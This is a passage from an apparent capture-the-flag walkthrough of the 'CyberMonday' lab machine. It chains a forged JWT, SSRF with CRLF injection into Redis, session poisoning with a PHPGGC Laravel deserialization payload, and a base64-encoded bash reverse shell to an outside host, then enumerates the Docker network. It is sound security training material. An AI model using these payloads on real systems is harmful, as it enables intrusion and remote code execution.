   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

jwttool_2e543fb6ba326f7160a8e1d3bb75decf - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweGRmIiwicm9sZSI6ImFkbWluIn0.5uYa8q7WRCvo26Ke-J0GOkgexryS8AEAjanCj1WbCW8

```

### Get SSRF

#### Create Webhook

Armed with this forged token, I can retry to create a webhook:

```

oxdf@hacky$ export ADMIN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweGRmIiwicm9sZSI6ImFkbWluIn0.5uYa8q7WRCvo26Ke-J0GOkgexryS8AEAjanCj1WbCW8
oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $ADMIN" -d '{"name": "0xdf-webhook", "description": "hacking this thing", "action": "root"}' -H "Content-type: application/json"
{"status":"error","message":"Only letters, numbers and underscores are allowed in the \"name\"","status_code":400}

```

This is progress! It’s no longer saying unauthorized, but rather picking at my inputs. Try again:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $ADMIN" -d '{"name": "0xdf", "description": "hacking this thing", "action": "root"}' -H "Content-type: application/json"
{"status":"error","message":"This action is not available","actions":["sendRequest","createLogFile"]}

```

This time it doesn’t like the `action`, and nicely reports that it must be `sendRequest` or `createLogFile`. This time it takes:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $ADMIN" -d '{"name": "0xdf", "description": "hacking this thing", "action": "createLogFile"}' -H "Content-type: application/json"
{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"ce09b165-912f-45a9-b94c-2bdc68c06117"}

```

It’s there:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks -H "x-access-token: $ADMIN" -s | jq .
{
  "status": "success",
  "message": [
    {
      "id": 1,
      "uuid": "fda96d32-e8c8-4301-8fb3-c821a316cf77",
      "name": "tests",
      "description": "webhook for tests",
      "action": "createLogFile"
    },
    {
      "id": 2,
      "uuid": "ce09b165-912f-45a9-b94c-2bdc68c06117",
      "name": "0xdf",
      "description": "hacking this thing",
      "action": "createLogFile"
    }
  ]
}

```

#### Interact with Webhook

The API definition shows I can POST to `/webhooks/:uuid`:

```

"/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }

```

I’ll try with an empty body:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/ce09b165-912f-45a9-b94c-2bdc68c06117 -H "x-access-token: $ADMIN" -d '{}' -H "Content-type: application/json"
{"status":"error","message":"\"log_name\" not defined"}

```

It wants a `log_name`. That’s because the type of this one is `createLogFile`. I’ll try to write in my guess at the web root, but it fails:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/ce09b165-912f-45a9-b94c-2bdc68c06117 -H "x-access-token: $ADMIN" -d '{"log_name": "/var/www/html/test.txt", "log_content": "this is a test"}' -H "Content-type: application/json"
{"status":"error","message":"Only letters and numbers are allowed in the \"name\""}

```

If I just make the name “test”, it works:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/ce09b165-912f-45a9-b94c-2bdc68c06117 -H "x-access-token: $ADMIN" -d '{"log_name": "test", "log_content": "this is a test"}' -H "Content-type: application/json"
{"status":"success","message":"Log created"}

```

I am not able to find this file or exploit it in any way.

#### sendRequest

I’ll create another hook, this time with `action` of `sendRequest`:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $ADMIN" -d '{"name": "0xdf2", "description": "hacking this thing", "action": "sendRequest"}' -H "Content-type: application/json"
{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"3bc45560-46c3-4f6d-a5b0-6524b57100fd"}

```

To trigger it, I’ll need a `url` and a `method`. I’ll start a Python webserver and request a file that doesn’t exist on my server:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/3bc45560-46c3-4f6d-a5b0-6524b57100fd -H "x-access-token: $ADMIN" -d '{"url": "http://10.10.14.6/test", "method": "GET"}' -H "Content-type: application/json"
{"status":"success","message":"URL is live","response":"<!DOCTYPE HTML>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>Error response<\/title>\n    <\/head>\n    <body>\n        <h1>Error response<\/h1>\n        <p>Error code: 404<\/p>\n        <p>Message: File not found.<\/p>\n        <p>Error code explanation: 404 - Nothing matches the given URI.<\/p>\n    <\/body>\n<\/html>\n"}

```

The full 404 response comes back, and there’s a hit at my server:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.228 - - [28/Nov/2023 19:12:56] code 404, message File not found
10.10.11.228 - - [28/Nov/2023 19:12:56] "GET /test HTTP/1.1" 404 -

```

#### CRLF Injection

If I want to interact with a non HTTP service, I can’t just use HTTP unless I figure out what to do with the headers. One idea is `gopher`, but it doesn’t work:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/3bc45560-46c3-4f6d-a5b0-6524b57100fd -H "x-access-token: $ADMIN" -d '{"url": "gopher://10.10.14.6/test", "method": "GET"}' -H "Content-type: application/json"
{"status":"error","message":"Only http protocol is allowed"}

```

Another idea is to play with the method. Does it have to be valid? When I send `{"url": "http://10.10.14.6/test", "method": "0xdf"}`, the result at `nc` listening on my host is:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.228 45018
0xdf /test HTTP/1.1
Host: 10.10.14.6
Accept: */*

```

So there’s no method validation. Can I put in newlines? I’ll try `{"url": "http://10.10.14.6/test", "method": "0xdf\r\nline 2\r\nline3"}`, and it works:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.228 45400
0xdf
line 2
line3 /test HTTP/1.1
Host: 10.10.14.6
Accept: */*

```

This is perfect, as now I can send whatever I want at the top of the request.

### Shell

#### Strategy

The idea is that I’m going to use the SSRF to interact with Redis, and set the session data for my user to a payload to perform a deserialization attack. Then when I refresh the main site, the payload will be deserialized and I’ll get execution.

This step takes a *ton* of playing around with, and it’s mostly blind, though Ippsec and I were able to figure out some neat tricks to get some signal back. I can’t show all the failures it took to get to a working payload in a blog post, but it was many.

I also went down some rabbit holes trying to send data in the [Redis serialization protocol](https://redis.io/docs/reference/protocol-spec/) (inspired by [this gist](https://gist.github.com/eeddaann/6e2b70e36f7586a556487f663b97760e)), but later figured out I could just use the ASCII commands and it works too, so I’ll work with that.

#### Fail Getting Redis Output

My first though is to try run the simplest Redis command, `ping` ([docs](https://redis.io/commands/ping/)). It should just return “PONG”. I’ll try that in my SSRF payload, but it returns the “URL is not live” error:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/3bc45560-46c3-4f6d-a5b0-6524b57100fd -H "x-access-token: $ADMIN" -d '{"url": "http://redis:6379", "method": "\r\nPING\r\n"}' -H "Content-type: application/json"
{"status":"error","message":"URL is not live"}

```

Unfortunately, it just returns an error. That suggests that either I’m doing something wrong, or that the response isn’t what the Webhook is expecting and it crashes.

I can try other things like listing keys, but same result:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/3bc45560-46c3-4f6d-a5b0-6524b57100fd -H "x-access-token: $ADMIN" -d '{"url": "http://redis:6379", "method": "\r\nkeys *\r\n"}' -H "Content-type: application/json"
{"status":"error","message":"URL is not live"}

```

It still fails. Unfortunately, however the webhook code is set up, it can’t seem to get data back from Redis. This makes sense as the webhook is expecting an HTTP response back. Based on looking at the payloads if I send them to myself, they look right, so I’m going to proceed blind.

#### Write Key and Exfil

I’m also going to switch into Burp Repeater for sending requests. The payloads are about to get complex, and I’ll need to be able to use both single and double quotes, which from the `bash` command line is a huge pain. I’ll add `-x localhost:8080` to the end of a `curl` command, and that sends it to Burp, where I can find it in my history and send that request to repeater.

I want to be able to write a key, so I can try something like this:

![image-20231129120501908](/img/image-20231129120501908.png)

The challenge here is to know if that worked. To check, I’m going to stand up my own Redis server in a Docker container, making sure to forward port 6379 on my VM to that port on the container:

```

oxdf@hacky$ docker run redis
Unable to find image 'redis:latest' locally
latest: Pulling from library/redis
1f7ce2fa46ab: Pull complete
3c6368585bf1: Pull complete
3911d271d7d8: Pull complete
ac88aa9d4021: Pull complete
127cd75a68a2: Pull complete
4f4fb700ef54: Pull complete
f3993c1104fc: Pull complete
Digest: sha256:2976bc0437deff693af2dcf081a1d1758de8b413e6de861151a5a136c25eb9e4
Status: Downloaded newer image for redis:latest
oxdf@hacky$ docker run -p 6379:6379 redis
1:C 29 Nov 2023 19:58:28.791 # WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can also cause failures without low 
memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for
 this to take effect.
1:C 29 Nov 2023 19:58:28.791 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1:C 29 Nov 2023 19:58:28.791 * Redis version=7.2.3, bits=64, commit=00000000, modified=0, pid=1, just started
1:C 29 Nov 2023 19:58:28.791 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
1:M 29 Nov 2023 19:58:28.791 * monotonic clock: POSIX clock_gettime
1:M 29 Nov 2023 19:58:28.792 * Running mode=standalone, port=6379.
1:M 29 Nov 2023 19:58:28.792 * Server initialized
1:M 29 Nov 2023 19:58:28.792 * Ready to accept connections tcp

```

In a different window, I’ll get a session with that Redis instance:

```

oxdf@hacky$ redis-cli
127.0.0.1:6379> keys *
(empty array)

```

To get a key from Cybermonday’s Redis, I’ll use the `MIGRATE` command. It’s important to be careful with this command. The [docs](https://redis.io/commands/migrate/) say:

> This command actually executes a DUMP+DEL in the source instance, and a RESTORE in the target instance.

It will delete the key from the current server and send it to the new one by default. If I add the `COPY` directive, it won’t delete, which is nice (though for the test key I just created and later for my own session information, deleting is ok as well). I’ll also add the `REPLACE` command. This tells Redis to overwrite the key in my instance if it’s already there.

The syntax I’ll use for `MIGRATE` is `MIGRATE [host] [port] [key] [destination-db] [timeout] COPY REPLACE`.

I’ll send the command:

![image-20231129125154929](/img/image-20231129125154929.png)

In my local instance, the key is there with the data:

```
127.0.0.1:6379> keys *
1) "0xdftestkey"
127.0.0.1:6379> get 0xdftestkey
"this is test data"

```

I can write keys into Redis!

#### Decrypt Session ID

Laravel stores the session data for a session in Redis under the key formatted as `[prefix][sessionid]`. I have the prefix `laravel_session:` from the `.env` file. I need to get the session ID from the cookie.

I’ll take a look at an existing Laravel session cookie, pulling the `cybermonday_session` cookie from my browser dev tools:

```

eyJpdiI6IlZKRWZNMkRDT1QwRmxPdXROMmsxbHc9PSIsInZhbHVlIjoiYjlhSU0xUmViUkNxdEhMejhibTJFTjZrVkp2SHhQRDd4TkJCN0dYSk1YODBtZVkxa2dJb29PVlNpL05Ga2xXeTMralRDN0kzZmdrejJ2ZEJIN24yamI5ZDFqSFMzdy9KV29TODFRRVpoYUpMS0FmbE5JbUtrWEVjVUgvcG5yWGUiLCJtYWMiOiI1MWJlOTZiMjVkNTdhZTMzZjE1OGZmZjdjZjJkN2FhYTBiMzBlN2YyZmNkODA5YzQ4Yzk2NTc4NDlkYzA3M2U3IiwidGFnIjoiIn0%3D

```

It’s a big URL-encoded base64-encoded blob. I’ll replace the `%3D` with `=` and decode it (using `jq` to pretty print):

```

oxdf@hacky$ echo "eyJpdiI6IlZKRWZNMkRDT1QwRmxPdXROMmsxbHc9PSIsInZhbHVlIjoiYjlhSU0xUmViUkNxdEhMejhibTJFTjZrVkp2SHhQRDd4TkJCN0dYSk1YODBtZVkxa2dJb29PVlNpL05Ga2xXeTMralRDN0kzZmdrejJ2ZEJIN24yamI5ZDFqSFMzdy9KV29TODFRRVpoYUpMS0FmbE5JbUtrWEVjVUgvcG5yWGUiLCJtYWMiOiI1MWJlOTZiMjVkNTdhZTMzZjE1OGZmZjdjZjJkN2FhYTBiMzBlN2YyZmNkODA5YzQ4Yzk2NTc4NDlkYzA3M2U3IiwidGFnIjoiIn0=" | base64 -d | jq .
{
  "iv": "VJEfM2DCOT0FlOutN2k1lw==",
  "value": "b9aIM1RebRCqtHLz8bm2EN6kVJvHxPD7xNBB7GXJMX80meY1kgIooOVSi/NFklWy3+jTC7I3fgkz2vdBH7n2jb9d1jHS3w/JWoS81QEZhaJLKAflNImKkXEcUH/pnrXe",
  "mac": "51be96b25d57ae33f158fff7cf2d7aaa0b30e7f2fcd809c48c9657849dc073e7",
  "tag": ""
}

```

It’s got an `iv` and a `value`. In Laravel, the session cookie is AES encrypted using the key. I happened to leak that key in the `.env` file [above](#env). I’ll decrypt it with [CyberChef](https://cyberchef.io/):

![image-20231128160709324](/img/image-20231128160709324.png)

The input gets base64 decoded, and then decrypted using the key and iv:

```

25c6a7ecd50b519b7758877cdc95726f29500d4c|cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ

```

The half after the pipe is the session id.

#### Replace Session Data

With the session id, plus the prefix from the `.env` file, I can try to poison the session data. I’ll start with a dummy string, using `set laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ 0xdf_was_here`:

![image-20231129125417617](/img/image-20231129125417617.png)

I’m doing both the set and the exfil of the result here. I can verify it worked by checking my Redis:

```
127.0.0.1:6379> keys *
1) "0xdftestkey"
2) "laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ"
127.0.0.1:6379> get laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ
"0xdf_was_here"

```

More importantly, when I refresh `http://cybermonday.htb` in the browser, it crashes!

![image-20231128161100360](/img/image-20231128161100360.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

It’s calling `unserialize` on the payload and crashing!

#### Deserialization Payload

[PHPGGC](https://github.com/ambionics/phpggc) is the tool for creating deserialization payloads for PHP. This will use the gadgets available from various popular PHP frameworks to get execution. I’ll list and look at the Laravel ones:

```

oxdf@hacky$ ./phpggc -l | grep -i laravel
Laravel/FD1                               *                                                       File delete               __destruct     *    
Laravel/RCE1                              5.4.27                                                  RCE: Command              __destruct          
Laravel/RCE2                              5.4.0 <= 8.6.9+                                         RCE: Command              __destruct          
Laravel/RCE3                              5.5.0 <= 5.8.35                                         RCE: Command              __destruct     *    
Laravel/RCE4                              5.4.0 <= 8.6.9+                                         RCE: Command              __destruct          
Laravel/RCE5                              5.8.30                                                  RCE: PHP Code             __destruct     *    
Laravel/RCE6                              5.5.* <= 5.8.35                                         RCE: PHP Code             __destruct     *    
Laravel/RCE7                              ? <= 8.16.1                                             RCE: Command              __destruct     *    
Laravel/RCE8                              7.0.0 <= 8.6.9+                                         RCE: Command              __destruct     *    
Laravel/RCE9                              5.4.0 <= 9.1.8+                                         RCE: Command              __destruct          
Laravel/RCE10                             5.6.0 <= 9.1.8+                                         RCE: Command              __toString          
Laravel/RCE11                             5.4.0 <= 9.1.8+                                         RCE: Command              __destruct          
Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                   RCE: Command              __destruct     *    
Laravel/RCE13                             5.3.0 <= 9.5.1+                                         RCE: Command              __destruct     *    
Laravel/RCE14                             5.3.0 <= 9.5.1+                                         RCE: Command              __destruct          
Laravel/RCE15                             5.5.0 <= v9.5.1+                                        RCE: Command              __destruct          
Laravel/RCE16                             5.6.0 <= v9.5.1+                                        RCE: Command              __destruct          
Laravel/RCE17                             10.31.0                                                 RCE: Command              __destruct          
Laravel/RCE18                             10.31.0                                                 RCE: PHP Code             __destruct     *    

```

I know from the debug crash that this is Laravel 9.46.0. There are none that specifically include this version, but many end with a “+”, suggesting they go higher. I’ll focus on 9-11 and 13-16. I also want gadgets that have all ASCII characters. The biggest risk is null bytes. For example, `RCE9`:

![image-20231128162220334](/img/image-20231128162220334.png)

There may be a way to encode that, but I’d rather start with one with no nulls. I’ll write myself a quick `bash` loop to check each payload, and `RCE10` jumps out as the winner:

```

oxdf@hacky$ for num in 9 10 11 13 14 15 16; do ./phpggc Laravel/RCE${num} system id | grep -Paq "\x00" || echo "RCE${num} is good"; done
RCE10 is good

```

I’ll grab that payload:

```

oxdf@hacky$ ./phpggc Laravel/RCE10 system id
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:2:"id";}i:1;s:4:"user";}}

```

#### RCE POC

I’ll take the payload from above and drop it into Burp. I’ll need to wrap it in single quotes for Redis to handle it. When I first paste it in, Burp makes it clear that my double quotes are off with the coloring:

![image-20231129125603846](/img/image-20231129125603846.png)

If I send this, it does fail:

![image-20231129123956029](/img/image-20231129123956029.png)

The server can’t extract the `url` parameter because of the unescaped double quotes.

Once I escape the inner double quotes, it looks like this:

![image-20231129125716220](/img/image-20231129125716220.png)

Sending this *still* fails, with the same `\"url\" not defined` message. As I am using the `\` to escape double quotes, I also need to escape the slashes.

![image-20231129125806732](/img/image-20231129125806732.png)

On sending this, it goes back to the “good” fail message, but the key isn’t changed in my Redis instance. The issue is that I need to wrap that long payload in single quotes to set it as a key.

![image-20231129125901758](/img/image-20231129125901758.png)

On sending that, I see the updated payload in my Redis:

```
127.0.0.1:6379> get laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ
"O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:2:\"id\";}i:1;s:4:\"user\";}}"

```

On refreshing the page, there’s the output of the command at the top right!

![image-20231128164618262](/img/image-20231128164618262.png)

That is code execution!

#### Shell

I’ll create a simple [bash reverse shell payload](https://www.youtube.com/watch?v=OjkVep2EIlw) and base64 encode it:

```

oxdf@hacky$ echo 'bash -c "bash -i  >& /dev/tcp/10.10.14.6/443 0>&1"' | base64 
YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK

```

Now the payload I give to `phpggc` doesn’t have to have quotes in it. I’ll make a payload:

```

oxdf@hacky$ ./phpggc Laravel/RCE10 system 'echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64 -d|bash'
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:88:"echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64 -d|bash";}i:1;s:4:"user";}}

```

I’ll update the request in Repeater. I actually only need to replace `s:2:\"id\";}` with `s:88:"echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64 -d|bash";}`, or I can replace the entire thing (and re-escape as above):

![image-20231129130211009](/img/image-20231129130211009.png)

The payload looks successful in Redis:

```
127.0.0.1:6379> get laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ
"O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:88:\"echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64 -d|bash\";}i:1;s:4:\"user\";}}"

```

When I refresh the page, it hangs, but there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.228 48826
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@070370e2cdc4:~/html/public$

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@070370e2cdc4:~/html/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'. 
www-data@070370e2cdc4:~/html/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@070370e2cdc4:~/html/public$ 

```

## Shell as john

### Container Enumeration

#### Identify Container

This is very much a docker container. There are no users with home directories in `/home`. Only the root user has a shell set in `/etc/passwd`:

```

www-data@070370e2cdc4:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash

```

Neither `ip` nor `ifconfig` are installed, but `/proc/net/fib_trie` shows an IP of 172.18.0.7:

```

www-data@070370e2cdc4:~$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.7
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5                               
     |-- 0.0.0.0
        /0 universe UNICAST                         
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0                      
           |-- 127.0.0.0
              /32 link BROADCAST                    
              /8 host LOCAL                         
           |-- 127.0.0.1                            
              /32 host LOCAL
        |-- 127.255.255.255                         
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2                        
        +-- 172.18.0.0/29 2 0 2                     
           |-- 172.18.0.0                           
              /32 link BROADCAST
              /16 link UNICAST                      
           |-- 172.18.0.7                           
              /32 host LOCAL                        
        |-- 172.18.255.255
           /32 link BROADCAST 

```

In the filesystem root, there’s a `.dockerenv` file:

```

www-data@070370e2cdc4:/$ ls -a
.           bin   etc   lib32   media  proc  sbin  tmp
..          boot  home  lib64   mnt    root  srv   usr
.dockerenv  dev   lib   libx32  opt    run   sys   var

```

Typically Docker gives the host the .1 IP, and then numbers of from there, so there could be a bunch of containers here.

#### /mnt

I noted [above](#env) that the Changelog file was in `/mnt`. `/mnt` is `/dev/sda1`:

```

www-data@070370e2cdc4:/mnt$ mount | grep mnt
/dev/sda1 on /mnt type ext4 (ro,relatime,errors=remount-ro)

```

Looking at the files, it looks like a home directory:

```

www-data@070370e2cdc4:/mnt$ ls -la
total 40
drwxr-xr-x 5 1000 1000 4096 Aug  3 09:51 .
drwxr-xr-x 1 root root 4096 Jul  3 05:00 ..
lrwxrwxrwx 1 root root    9 Jun  4 02:07 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 May 29  2023 .bash_logout
-rw-r--r-- 1 1000 1000 3526 May 29  2023 .bashrc
drwxr-xr-x 3 1000 1000 4096 Aug  3 09:51 .local
-rw-r--r-- 1 1000 1000  807 May 29  2023 .profile
drwxr-xr-x 2 1000 1000 4096 Aug  3 09:51 .ssh
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 3 root root 4096 Nov 28 19:53 logs
-rw-r----- 1 root 1000   33 Nov 10 00:11 user.txt

```

There’s `user.txt`, though I can’t read it. There’s also a `.ssh` directory. It doesn’t have any private keys, but there is an `authorized_keys` file:

```

www-data@070370e2cdc4:/mnt$ ls .ssh/
authorized_keys
www-data@070370e2cdc4:/mnt$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday

```

The public key ends with john@cybermonday. I’ll note that as likely the owner of this directory.

`logs` is also interesting, as it seems to have folders named after the name of the log webhooks:

```

www-data@070370e2cdc4:/mnt/logs$ ls
0xdf
www-data@070370e2cdc4:/mnt/logs$ ls 0xdf
test-1701202097.log  test-1701256572.log  test-1701258070.log

```

### Network Enumeration

#### Identify Hosts

`ping` isn’t installed on the container, so I’ll identify host by uploading a [statically compiled nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap). When I try to run it, there are errors:

```

www-data@070370e2cdc4:/tmp$ ./nmap 172.18.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-11-29 02:23 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to open /etc/services for reading service information
QUITTING!

```

To fix this, I’ll upload a copy of `/etc/services` and save it as `nmap-services` in the same directory as `nmap`.

I’ll start by scanning ips 1-10, assuming that Docker will give out IPs sequentially:

```

www-data@070370e2cdc4:/tmp$ ./nmap --min-rate 10000 172.18.0.1-10

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-11-29 02:28 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.0040s latency).
Not shown: 1154 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for cybermonday_db_1.cybermonday_default (172.18.0.2)
Host is up (0.0039s latency).
Not shown: 1155 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for cybermonday_api_1.cybermonday_default (172.18.0.3)
Host is up (0.0034s latency).
Not shown: 1155 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for cybermonday_nginx_1.cybermonday_default (172.18.0.4)
Host is up (0.0037s latency).
Not shown: 1155 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.5)
Host is up (0.12s latency).
All 1156 scanned ports on cybermonday_registry_1.cybermonday_default (172.18.0.5) are closed

Nmap scan report for cybermonday_redis_1.cybermonday_default (172.18.0.6)
Host is up (0.12s latency).
Not shown: 1155 closed ports
PORT     STATE SERVICE
6379/tcp open  redis

Nmap scan report for 070370e2cdc4 (172.18.0.7)
Host is up (0.21s latency).
All 1156 scanned ports on 070370e2cdc4 (172.18.0.7) are closed

Nmap done: 10 IP addresses (7 hosts up) scanned in 15.52 seconds

```

It finds 7 hosts, including their hostnames:
- 172.18.0.1 - The host, open on 80 and 22. 80 is probably forwarding to the nginx container.
- 172.18.0.2 - `cybermonday_db_1.cybermonday_default` - Listening on 3306. This must be the MySQL container.
- 172.18.0.3 - `cybermonday_api_1.cybermonday_default` - Listening on port 80. nginx must be routing the API virtual host to this container.
- 172.18.0.4 - `cybermonday_nginx_1.cybermonday_default` - Listening on port 80, routing through to the appropriate container.
- 172.18.0.5 - `cybermonday_registry_1.cybermonday_default` - No listening. I’ll want to explore this further.
- 172.18.0.6 - `cybermonday_redis_1.cybermonday_default` - Listening on 6379. This is the Redis DB.
- 172.18.0.7 - `070370e2cdc4` - This is the container I am currently in.

#### Registry

The only container I haven’t seen yet or interacted with yet is the “registry” one. I’ll scan all ports to see what’s listening:

```

www-data@070370e2cdc4:/tmp$ ./nmap -p- --min-rate 10000 172.18.0.5   

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-11-29 02:36 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for cybermonday_registry_1.cybermonday_default (172.18.0.5)
Host is up (0.0015s latency).
